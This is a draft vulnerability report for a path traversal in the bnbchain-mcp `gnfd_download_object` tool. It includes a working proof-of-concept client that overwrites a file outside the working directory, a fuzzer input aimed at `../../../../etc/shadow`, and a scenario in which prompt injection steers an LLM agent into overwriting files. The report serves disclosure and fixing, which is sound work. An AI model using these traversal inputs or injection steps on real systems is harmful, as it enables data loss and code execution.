# Path traversal in `gnfd_download_object`: `targetPath` and `objectName` can write or overwrite files outside the working directory

**Repository:** `bnb-chain/bnbchain-mcp` · **Tool:** `gnfd_download_object` · **Tested commit:** `a133675`
**Weakness:** CWE-22 Path Traversal

## Summary
`gnfd_download_object` downloads an object from a Greenfield bucket and writes it to disk. The destination is `path.join(targetPath, objectName)`, where both parts come from the caller and neither is checked. A `targetPath` such as `..` writes outside the server's working directory, and an existing file with the same name is overwritten without warning. The written content is whatever the Greenfield object holds.

## Details
`src/gnfd/services/object.ts:413-446` at `a133675`:

```ts
    let filePath = ""
    if (!targetPath || !existsSync(targetPath)) {
      ...
      filePath = path.join(process.cwd(), `tmp-${objectName}`)
    } else {
      filePath = path.join(targetPath, objectName)
    }
    ...
    const buffer = await file.arrayBuffer()
    writeFileSync(filePath, Buffer.from(buffer))

    return response.success({ file: filePath })
```

The tool handler (`src/gnfd/tools/storage.ts:286-310`) passes `targetPath` and `objectName` through unchanged. `targetPath` can be any existing directory, absolute or relative. `objectName` is joined into both branches, so separators or `..` inside it also move the destination, if Greenfield accepts such an object name. `writeFileSync` uses the default `w` flag, so existing files are replaced.

## Steps to reproduce
1. Prerequisites: Node.js 18 or later, Bun 1.2.10 or later, and a Greenfield testnet account with test BNB, passed to the server as `PRIVATE_KEY`. Create the marker file, an empty working directory, and a staging file to upload:
   ```
   mkdir -p /tmp/tofu-poc/root /tmp/tofu-poc/stage
   echo marker > /tmp/tofu-poc/outside.txt
   echo tofu-poc-overwrite > /tmp/tofu-poc/stage/outside.txt
   ```
2. Install and build the server:
   ```
   git clone https://github.com/bnb-chain/bnbchain-mcp.git
   cd bnbchain-mcp && git checkout a133675365d5d941d891b17a42f2ca587c33922a
   bun install && bun run build
   ```
   The client below starts `node dist/index.js` with `/tmp/tofu-poc/root` as its working directory.
3. Upload the staging file as object `outside.txt`, then download it with `targetPath: ".."`:
   ```json
   {"network": "testnet", "bucketName": "tofu-poc-bucket-1234", "objectName": "outside.txt", "targetPath": ".."}
   ```

   ```python
   import asyncio
   import os
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   BUCKET = "tofu-poc-bucket-1234"

   async def main():
       server = StdioServerParameters(
           command="node",
           args=["/absolute/path/to/bnbchain-mcp/dist/index.js"],
           cwd="/tmp/tofu-poc/root",
           env={"PRIVATE_KEY": os.environ["GNFD_TESTNET_PRIVATE_KEY"]},
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               print(await session.call_tool("gnfd_create_file", {
                   "network": "testnet", "bucketName": BUCKET,
                   "filePath": "/tmp/tofu-poc/stage/outside.txt"}))
               result = await session.call_tool("gnfd_download_object", {
                   "network": "testnet", "bucketName": BUCKET,
                   "objectName": "outside.txt", "targetPath": ".."})
               print(result)

   asyncio.run(main())
   ```
4. What to observe: the download returns `"status": "success"` with `"file": "../outside.txt"`. `cat /tmp/tofu-poc/outside.txt` now prints `tofu-poc-overwrite` instead of `marker`. The file outside the working directory was overwritten.

## Expected behavior
Downloads should land only inside a directory the operator configured. A `targetPath` or `objectName` that resolves outside it should be rejected, and an existing file should not be replaced unless the caller asks for that explicitly.

## Actual behavior
Both values are joined and written with no check. In the fuzzing run the call with `targetPath: "../../../../<file>"` stopped earlier, at the key check, because the run used an empty private key:

```
"message": "Failed to download object: {\"code\":-1,\"message\":\"private key should start with 0x\",\"statusCode\":404}"
```

The write itself was not reached in the logged runs. The behavior above follows from `object.ts:413-446`.

## Impact
The LLM picks the tool arguments, and prompt injection in untrusted content can steer them. An injected instruction can make the agent download an object and write it into any directory the server user can write to, replacing a file of the same name. If the object is one the attacker controls and the user's account can read (for example a public-read object), the attacker also chooses the content. Depending on what gets overwritten, this can range from data loss to code execution as the server user.

## Suggested fix
- Add a download root, for example a `GNFD_DOWNLOAD_ROOT` environment variable that defaults to a dedicated directory. Resolve the final path and reject it if `path.relative(root, resolved)` starts with `..` or is absolute.
- Use `path.basename(objectName)` for the local file name, or reject object names that contain path separators or `..`.
- Open the file with the `wx` flag so an existing file is not overwritten unless the caller passes an explicit `overwrite: true`.

## Status on the default branch
Still present at `a133675` (2026-04-17). The tested commit is the head of the default branch.

## Prior reports
- #25 "SECURITY: Fix path traversal in Greenfield download" (PR, closed 2026-04-08): reports this bug ("objectName joined with targetPath without sanitization", files can be written anywhere) and proposed `path.basename()` on `objectName`. Not merged: `src/gnfd/services/object.ts:422` at `a133675` (2026-04-17) still has `path.join(targetPath, objectName)`. A basename on `objectName` alone would also not have confined `targetPath`.
- #65 "Security Audit: Comprehensive Vulnerability Assessment — 8 Findings (1C, 2H, 3M, 2L)" (issue, open 2026-03-20): states it excludes findings already covered by PRs #23 to #62, so it does not repeat the download traversal.
- Documentation: README.md: "Download an object from a bucket" (the only description of the tool; no download directory or path limit is documented, and the schema describes `targetPath` only as "The path to save the downloaded object")

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: already reported in PR #25 (closed without merging; the bug is still present at `a133675`). Cite #25 when filing; the new point is that `targetPath` itself is unchecked.
- ToFu class / sanitizers: path-traversal via `check_path_traversal`, the only sanitizer that fired for this tool (silent-bug alert on the input).
- Campaigns and executions: corpus-sbx 512 exec / 461 ok (60 s); e2-0922 512 exec / 469 ok (60 s).
- Evidence (verbatim, trimmed): input `{'network': 'testnet', 'bucketName': 'created-by-bnbchain-mcp', 'objectName': 'validfile.txt', 'targetPath': '../../../../etc/shadow', 'privateKey': ''}` -> `"message": "Failed to download object: {\"code\":-1,\"message\":\"private key should start with 0x\",\"statusCode\":404}"`.
- Hand-check hints: real in code, not demonstrated by a run. The fuzzer only flagged the input; the logged call failed at the Greenfield SDK key check, so no file was written in any run. The unchecked `path.join(targetPath, objectName)` + `writeFileSync` is clear from the code, but `targetPath` is documented as "The path to save the downloaded object", so a maintainer may call caller-chosen destinations intended. The reproduction needs a funded Greenfield testnet key and was not run. Not verified: whether Greenfield accepts object names with `..` (the `objectName` variant), and whether a user's key can `getObject` another account's public-read object (the attacker-content claim in Impact is hedged for that reason). Side note: when `targetPath` is missing or does not exist, the file goes to `cwd/tmp-<objectName>`, which is still affected by `objectName`.
</details>
